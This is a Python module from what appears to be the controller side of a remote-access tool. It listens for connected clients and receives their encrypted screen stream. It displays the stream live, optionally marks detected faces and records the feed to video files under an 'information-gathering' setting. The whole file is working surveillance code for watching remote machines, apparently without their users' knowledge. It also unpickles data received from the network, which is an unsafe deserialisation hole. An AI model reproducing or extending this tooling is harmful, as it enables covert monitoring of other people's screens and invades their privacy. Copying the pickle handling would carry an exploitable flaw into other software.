import threading
import random
import pickle
import zlib
import cv2

from domestic.parse.internal_server_error_exception_handling import *
from domestic.parse.error_exception_handling import *
from domestic.utility.validate_dict_key import *
from domestic.session.session_message import *
from domestic.utility.status_message import *
from domestic.modules.socket_handler import *
from domestic.make.make_directories import *
from domestic.utility.get_filename import *
from domestic.utility.write_error import *
from domestic.global_state import *


@internal_server_error_exception_handling
def stream_action(resolution, recognize, fit):
	try:
		headersize = state['settings']['headersize']
		encryption = state['settings']['encryption']
		encoding = state['settings']['encoding']
		username = state['session']['username']
		mode = [True, 0, b'']

		stream_id = random.randint(0, 100000)
		record = state['options']['information-gathering']['record']['stream']
		client, addr = state['sockets']['modules']['stream'][0].accept()
		client_obj = (client, username, addr)
		state['sockets']['modules']['stream'][1].append(client_obj)

		if recognize:
			parent_folder = state['settings']['folders']['parent']
			child_folder = state['settings']['folders']['child'][2]
			faceCascade = cv2.CascadeClassifier(f'{state["root"]}/{parent_folder}/{child_folder}/{recognize}')
	
		if record:
			directories = ['modules', 'modules/stream']
			username = state['session']['username']
			path = f'{state["root"]}/{username}/{directories[-1]}/{get_filename("avi")}'
			directories_to_make = [username] + [f'{username}/{directory}' for directory in directories]
			make_directories(directories_to_make)

			fourcc = cv2.VideoWriter_fourcc(*'XVID')
			out = cv2.VideoWriter(path, fourcc, 5.0, resolution)

		message = pickle.dumps(b' ')
		message = zlib.compress(message, 1)
		message = encryption.do_encrypt(message)
		final_msg = bytes(f'{len(message):<{headersize}}', encoding) + message
		client.send(final_msg)

		while True:
			client_msg = client.recv(81920)

			if mode[0]:
				mode[1] = int(client_msg[:headersize])
				mode[0] = False

			mode[2] += client_msg

			if len(mode[2])-headersize == mode[1]:
				frame = encryption.do_decrypt(mode[2][headersize:])
				frame = zlib.decompress(frame)
				frame = pickle.loads(frame)

				if recognize:
					faces = faceCascade.detectMultiScale(frame, scaleFactor=1.1, minNeighbors=5, minSize=(15, 15), flags=cv2.CASCADE_SCALE_IMAGE)

					for (x, y, w, h) in faces:
						cv2.rectangle(frame, (x, y), (x + w, y + h), (255, 255, 0), 2)

				if fit is None:
					cv2.namedWindow(f'{username} - Live stream (stream id: {stream_id})', cv2.WINDOW_NORMAL)
				
				cv2.imshow(f'{username} - Live stream (stream id: {stream_id})', frame)

				if record:
					out.write(frame)

				if cv2.waitKey(1) == 27:
					raise Exception('Close stream')
			
				real_msg = pickle.dumps(b' ')
				real_msg = zlib.compress(real_msg, 1)
				real_msg = encryption.do_encrypt(real_msg)
				final_msg = bytes(f'{len(real_msg):<{headersize}}', encoding) + real_msg
				client.send(final_msg)
				
				mode = [True, 0, b'']
	except Exception as err:
		write_error(err)
		try:
			state['sockets']['modules']['stream'][1].remove(client_obj)

			if record:
				out.release()
		except Exception as err:
			write_error(err)
		finally:
			sys.exit(0)


@error_exception_handling
def stream(data):
	ip = validate_dict_key(data, 'ip')
	port = validate_dict_key(data, 'port')
	unbind = validate_dict_key(data, 'unbind')
	resolution = validate_dict_key(data, 'resolution')
	monitor = validate_dict_key(data, 'monitor')
	close = validate_dict_key(data, 'close')
	status = validate_dict_key(data, 'status')
	fps = validate_dict_key(data, 'fps')
	fit = validate_dict_key(data, 'fit')
	recognize = validate_dict_key(data, 'recognize')

	if resolution:
		assert state['session']['active']
		
		data['resolution'] = tuple([int(x) for x in resolution.split(',')])

		if ip and port:
			data['ip'], data['port'] = ip, int(port)
		else:
			data['ip'], data['port'] = state['sockets']['modules']['stream'][0].getsockname()

		if monitor:
			data['monitor'] = int(monitor)
		else:
			data['monitor'] = 0

		if fps is None:
			data['fps'] = False

		if fit:
			del data['fit']

		if recognize:
			del data['recognize']
			
		threading.Thread(target=stream_action, args=(data['resolution'], recognize, fit), daemon=True).start()
		session_message(data)
	elif ip and port:
		if state['sockets']['modules']['stream'][0] is None:
			bind_socket(ip, port, 'stream')
		else:
			ip, port = state['sockets']['modules']['stream'][0].getsockname()
			status_message(f'You are already listening for clients (stream module) on {ip}:{port}', 'danger', {'dots': True})
	elif unbind:
		if state['sockets']['modules']['stream'][0]:    
			unbind_socket('stream')
		else:
			status_message(f'You\'re not listening for clients (stream module)\nThere is no server socket (stream module) to close', 'warning')
	elif close:
		close_client(close, 'stream')
	elif status:
		if state['sockets']['modules']['stream'][0]:
			ip, port = state['sockets']['modules']['stream'][0].getsockname()
			status_message(f'You are listening for clients (stream module) on {ip}:{port}', 'primary')
		else:
			status_message('You are not listening for clients (stream module)', 'warning')
	else:
		raise Exception('Error message')